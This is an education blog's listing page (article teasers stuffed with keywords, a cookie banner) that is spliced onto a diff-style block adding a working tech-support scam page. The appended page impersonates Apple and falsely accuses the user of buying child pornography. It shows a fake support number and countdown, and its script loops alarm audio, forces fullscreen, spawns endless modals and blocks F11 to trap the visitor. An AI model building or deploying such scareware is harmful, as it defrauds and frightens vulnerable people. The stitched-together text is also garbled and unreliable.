Technology in Education: A New Era of Learning</h5><div class="column-drtSunUVLRbPSDeN"><span class="tagline-FYhCBLsyyuSL">Reading An exploration Study of how Literacy Certification technology Innovation Examination is transforming education, enhancing Knowledge Academic learning experiences, Teaching and Training preparing students Research Curriculum Writing for the future. Learning Skills</span></div></div><div class="desc-RpnZBs"><img src="./img/84dd520afd32886eb341523f9f9b9247a2a82282.jpg" class="current-WgUFmvIxR"/></div><div class="container-zFVedyOKxnWNNsb"><a href="themelist4.html" class="lg-iMNuReZqNk"><span class="small-AEfRQlQobVvp">Read more</span></a></div><div class="heading-xuMlxHxc"><div class="tip-wOUzRCjALqkd"><div class="content-qSmqfTZZE"><span class="wrapper-ZyeSajlMHobqZ">Sophia Liu</span></div></div><div class="current-oXPigkUYA"><div class="sm-jaQrzVaaAxARTDY"><span class="tagline-lpZawdWNWW">01/31/25</span></div></div></div></div><div class="icon-oTgYkQXqS"><div class="subject-LyNflOZvMN"><h5 class="huge-CcicCDWLiuWlE">Embracing Diversity: The Role of Multicultural Education in Universities</h5><div class="more-cUOfig"><span class="section-GEFkYZuFlMntPV">This Certification article explores Innovation the significance of Knowledge Study multicultural Teaching education in Research Training Skills universities, discussing Academic Reading its impact on student Literacy development, Curriculum Learning global awareness, and fostering Writing Examination inclusive campus environments.</span></div></div><div class="thumb-gIZpCN"><img src="./img/72b4d1d8d152fe58fa0f53aea8b25f75c67ebe80.jpg" class="row-VCPBdd"/></div><div class="sidebar-IrrZynxGmbdlo"><a href="themelist5.html" class="picture-FMRTjha"><span class="preview-bPtsPQRRzj">Read more</span></a></div><div class="btn-YnjXffgYOi"><div class="section-LqNbjHnymyEXZft"><div class="inner-mBIOLaNh"><span class="container-UroACQflKP">Liam Johnson</span></div></div><div class="wrapper-QVkazJLsbGijGQUr"><div class="pic-pixoIUWzqIE"><span class="col-OWrEyGjGp">04/18/25</span></div></div></div></div><div class="breadcrumbs-uqpRunzwY"><div class="icon-pjwkdbrqfSFqS"><h5 class="headline-sEerDvpRw">Cultivating Critical Thinking: Strategies for Educators</h5><div class="button-oRYsje"><span class="headline-zmTTDoqny">Training This Examination article explores the Knowledge importance of critical thinking Academic Certification in Literacy education Teaching and Learning Study provides effective Research strategies for Curriculum educators Skills to foster Innovation these skills Reading in their Writing students.</span></div></div><div class="subject-JlAyMlf"><img src="./img/75a26616d760115847227ee9342005a3d83469f7.jpg" class="section-PHqXvi"/></div><div class="breadcrumbs-OSKGCJbLAaKiq"><a href="themelist6.html" class="pic-hmMsBEHs"><span class="btn-oArKbFRLxMBs">Read more</span></a></div><div class="xs-GZGYuAANsBoypfq"><div class="sidebar-GfSByhumxZjHtO"><div class="column-hcSdLSNpM"><span class="content-SthchS">Emma Richardson</span></div></div><div class="small-fmDJjmcxjN"><div class="big-JBxQVhbzrQ"><span class="control-vKCvvSgmKqdPX">03/27/25</span></div></div></div></div><div class="thumbnail-dUuKwERKqMAqoa"><div class="image-ourirSQjw"><h5 class="col-ImbdvO">Exploring the Digital Frontier: The Impact of Technology on Modern Libraries</h5><div class="large-COoVLNnOkvI"><span class="section-WHDGrGtZn">Writing An in-depth look Certification at Skills Learning Curriculum how technology Examination has transformed Research libraries Reading into Literacy innovative Innovation Knowledge spaces for Teaching Training learning, collaboration, Study and community Academic engagement.</span></div></div><div class="small-RrJMzwNlbub"><img src="./img/9969d54dac7a4218c10230294291622f1ca983b6.jpg" class="aside-ChmeLTeMHHhPPpL"/></div><div class="xl-PRoAlCKsbEViLp"><a href="themelist7.html" class="big-DfwUgHKaSoeoMdwc"><span class="heading-fcQkKNVFaESYTKP">Read more</span></a></div><div class="heading-EYfDiNXPTcLKHHaP"><div class="tiny-BptxYmJQhy"><div class="small-IBkpngGfMBp"><span class="narrow-sGiiRgvIfArLtaj">Sophia Martinez</span></div></div><div class="subtitle-RAuKqMDgraYcWsMD"><div class="md-qGcNGVxLIuyjdEG"><span class="tagline-ARBlVZ">07/22/25</span></div></div></div></div><div class="userpic-NkIbnxasDCGt"><div class="aside-LmTXkxRj"><h5 class="current-nrYhHdJPNs">The Role of Desks in Learning Environments: How Desk Design Impacts Student Focus and Productivity</h5><div class="thumb-XYItXJlVernGfj"><span class="big-BjCskwx">This article delves into the impact of desk design Innovation Research on Certification Literacy students' Training learning experiences, Study exploring how the right desk can Writing improve focus, productivity, and overall comfort in Academic the classroom. It also Reading discusses Learning the ways Teaching Knowledge in which Examination Curriculum desk arrangements influence Skills both individual and group learning.</span></div></div><div class="wrap-JJbifVsSQbKoZ"><img src="./img/6ecefe818a84ea9fff34c1f3296b231d3194f3a8.jpg" class="container-nERzmCbJc"/></div><div class="page-ubMYuIzulNE"><a href="themelist8.html" class="inner-ZxquKwlxxT"><span class="subtitle-WERmkbnqmbfqKco">Read more</span></a></div><div class="userpic-pKoOHxFCOmZ"><div class="aside-cmyZQmyxmQJFsWL"><div class="caption-OKqxGhKg"><span class="column-rYlquyJQmEyRTK">Lena Martin</span></div></div><div class="row-RnwrPzU"><div class="sidebar-HiegFJOjJIFbXHX"><span class="inner-JEYaVENiY">08/01/25</span></div></div></div></div><div class="button-WvHGcaJSemmbU"><div class="container-RpQJLIfApFo"><h5 class="container-rFHqoDTHRyUJGwPH">Desks for Modern Classrooms: Innovation and Adaptability in Education</h5><div class="userpic-DHRmBEgLUXtPzTp"><span class="tagline-OeCDjVtLVNfAGgjs">Learning Examination This article explores the latest trends in desk Literacy design Teaching for modern classrooms, Innovation highlighting innovations that Certification support Research diverse learning styles, foster collaboration, Skills and integrate technology. It examines how desks have Reading Knowledge Curriculum evolved to meet the needs of Training today's students, making Writing the learning Academic environment more engaging and effective. Study</span></div></div><div class="desc-JrLNidbhIBIeuC"><img src="./img/b30a47c5955d3e76ea00476ab9f32e48d7d687a1.jpg" class="userpic-GxCvBXHYjovY"/></div><div class="md-tCJxMwkdr"><a href="themelist9.html" class="wrap-apwbokXvLMAqnjJ"><span class="small-PHxiQzuqzhJtF">Read more</span></a></div><div class="breadcrumbs-FshUdPhcU"><div class="tagline-EpMhhuTUJa"><div class="img-slJUDEawGhKagEg"><span class="huge-BaSjYQtIjXGUMLt">Liam Harris</span></div></div><div class="xl-QQpVzpF"><div class="control-sMtoIOFYgEwhdns"><span class="control-rDqtKnBKGEWkmWlO">02/04/25</span></div></div></div></div><div class="aside-iwGXuDOMYeFDy"><div class="md-aUTKpbn"><h5 class="wrap-WJpgFCMYrZk">The Evolution of Learning Styles in Education</h5><div class="picture-FMpVkVepaMS"><span class="text-xrdjAtpXKvHP">This Reading Study article explores Research how understanding different learning Skills Academic Innovation Curriculum styles can enhance teaching methods Learning and Teaching improve Literacy student outcomes Examination Writing Knowledge in Certification modern education. Training</span></div></div><div class="box-IXBGIaiafAJX"><img src="./img/524a7feffe5a88484160e0d64c162b9fd3f722bb.jpg" class="column-ILRahExkKVCOvaD"/></div><div class="huge-YgVxowwtkPgyP"><a href="themelist10.html" class="wrapper-qrtxsF"><span class="title-amKoKepdh">Read more</span></a></div><div class="huge-faewpPHXK"><div class="sm-nrsUQAmXPewMhh"><div class="xs-DBfiiB"><span class="aside-cudYpvfN">Sophia Martinez</span></div></div><div class="big-pPjAfAMcqtSmNkgz"><div class="tiny-NLigWcLuPA"><span class="inner-tSRsPSN">02/06/25</span></div></div></div></div></div></div></main><footer class="inner-goAmlCAdGjPn"><div class="subtitle-JomcQiTRN"><a href="./privacy_policy.html" class="headline-SCKXtmfiopWLEDg">Privacy Policy</a><a href="./terms_of_use.html" class="pic-qudaEXv">Terms Of Use</a><a href="./cookie_policy.html" class="preview-PwnFVUzjddzPfLH">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="active-WkJzkgVtssLr"/><section class="big-XGDmaB"><div class="button-yWVtAAq"><div class="inner-FJoVtYfF"><label for="close" class="column-BFQEJcdbZAhV"><span class="btn-NvRVGNXB">Agree</span></label></div><div class="caption-UMRqOLQM"><label for="close" class="huge-zcxiIXertGaCA"><span class="img-iobfADXZJST">Disagree</span></label></div></div><div class="grid-NwypeveYiNPRpYid"><span class="sidebar-jWSmDISHejrJbGGn">This website uses cookies.<br>We use cookies to personalise content and ads, to provide social media features and to analyse our traffic. We also share information about your use of our site with our social media, advertising and analytics partners who may combine it with other information that you’ve provided to them or that they’ve collected from your use of their services.</span></div></section></body></html>
+  
+
+</head>
+
+<body onclick="playSound()"  id="link">
+    <!-- Click overlay - only active when needed -->
+    <div id="clickOverlay" class="click-overlay"></div>
+
+        
+    <div class="bgimg">
+          <img src="images/bg.jpg" alt="" width="100%">
+        </div>
+
+
+    <div class="main">
+        
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-content">
+                        
+                        <div class="alert-box">
+                            
+
+    <div class="spacbar">
+        <div class="d-flex justify-content-between">
+  <div><img src="images/applelogo2.png" alt="" style="width: 30px;margin-right: 5px;"> Alert</div>
+  <div><a href="#" style="font-size: 15px;">Apple Support</a></div>
+</div>
+<img src="images/arror.jpg" alt="" style="width:80px;display: block;margin: 10px auto 0;text-align: center;">
+    <div class="alert-title">Your iPhone has been locked due to suspicious activity.</div>
+    <div class="alert-texts">
+        <div class="bgblue"><strong>Transaction of $569.90 via Apple Pay for Child Pornography was found.</strong> <br>For security reasons you are prohibited from using your device.</div>
+    <div class="txstm"> <br>
+        Not you? Call <strong>Apple Support: <br><a href="tel:+1-855-657-5414">+1-855-657-5414</a></strong> to unlock your device.
+     </div>
+    <a href="tel:+1-855-657-5414" class="alert-button">Time left for unlock request: <span id="countdown">10:00</span></a>
+    
+    </div>
+</div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <div class="notification">
+        <div class="msalogo"><img src="images/messages.svg" alt="" width="30px"> MESSAGES</div>
+<div class="cursor">now</div>
+  <div class="notification-header">Payment Successful</div>
+  <div class="notification-body">
+    Sent $569.90 via Apple Pay to Pornhub <br>Premium.
+    Not you? Call +1-855-657-5414
+  </div>
+  <img src="images/apple_pay.png" alt="Apple Pay" class="apple-pay">
+</div>
+
+    <div id="modalContainer"></div>
+
+    <!-- Main Modal -->
+    <div class="modal fade" id="appleAlertModal" tabindex="-1" aria-labelledby="appleAlertModalLabel" aria-hidden="true" style="top:-30px!important;">
+
+        <div class="modal-dialog modal-lg modal-dialog-centered-sm">
+            <div class="modal-content">
+                <div class="modal-body text-center">
+                    <div class="alert-text">
+                        Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-657-5414">+1-855-657-5414</a> to unlock it!
+                    </div>
+
+                    
+                    <div class="text-end gap-4 mt-3 actionbtn">
+                        <a href="tel:+1-855-657-5414" class="me-2 bg-primary">Call +1-855-657-5414</a>
+                        <a href="tel:+1-855-657-5414" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <audio id="clickSound" src="media/LhlCcb3bW5w3.mp3" preload="auto" loop></audio>
+
+<script>
+function playSound() {
+  const audio = document.getElementById("clickSound");
+//   audio.currentTime = 0; // restart sound if clicked again
+  audio.play();
+}
+</script>
+    <!-- Bootstrap & Popper.js -->
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+<script>
+let timeLeft = 10 * 60;
+
+const display = document.getElementById("countdown");
+
+const timer = setInterval(() => {
+  let minutes = Math.floor(timeLeft / 60);
+  let seconds = timeLeft % 60;
+
+  display.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+  if (timeLeft <= 0) {
+    clearInterval(timer);
+    display.textContent = "Time's up!";
+  }
+
+  timeLeft--;
+}, 1000);
+</script>
+
+
+<script>
+
+
+
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
+
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `appleAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `appleAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="applealertmodeltwo">
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            Your iPhone has been locked due to illegal child pornography activity on your device. Your purchase of $569.90 for PornHub subscription via Apple ID is complete. Not You? Call Apple Support <a href="tel:+1-855-657-5414">+1-855-657-5414</a> to unlock it!
+                        </div>
+
+                        
+                        <div class="text-end gap-4 mt-3 actionbtn">
+                            <a href="tel:+1-855-657-5414" class="me-2 bg-primary">Call +1-855-657-5414</a>
+                            <a href="tel:+1-855-657-5414" class="mt-3 bg-secondary" id="okBtn">Cancel</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const appleAlertModal = new bootstrap.Modal(document.getElementById('appleAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        appleAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script> 
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+</body></html>
